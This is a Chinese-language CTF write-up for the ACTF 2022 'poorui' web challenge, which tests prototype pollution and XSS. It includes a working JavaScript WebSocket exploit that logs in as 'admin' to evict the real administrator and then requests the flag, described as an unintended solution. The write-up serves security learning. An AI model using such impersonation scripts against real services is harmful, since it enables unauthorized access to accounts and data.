## 题目介绍

[附件](/CTF_ATTACHMENTS/2022/ACTF-poorui.zip)

```
Chatting with each other!
Attachment is update’d at 2022-06-26 11:34 (UTC+8)
http://124.71.181.238:8081/
```

考点：
- 原型链污染
- XSS

## Writeup

admin可以直接挤掉，然后直接getflag就行了，应该是非预期吧

> 看了下zer0pts的wp，果然是非预期，需要用原型链污染
> https://nanimokangaeteinai.hateblo.jp/entry/2022/06/28/045459

```javascript
var ws = new WebSocket("ws://124.71.181.238:8081/");

ws.onopen = () => {

    var login = JSON.stringify({ "api": "login", "username": "admin" })
    ws.send(login)
    var ctx = JSON.stringify({ "rdd": "wenhaoa"})
    var data = { "api": "getflag", "to": "flagbot", "msg": { "type": "tpl", "data": { "tpl": "test.tpl", "ctx": `${ctx}` } } }
    ws.send(JSON.stringify(data));
}

ws.onmessage = function (evt) {
    var received_msg = evt.data;
    document.write("received_msg.... ", received_msg, "<br>")
};
ws.onclose = function () {
    // 关闭 websocket
    document.write("close.... ", "<br>")
};


document.write("send.... login <br>")
```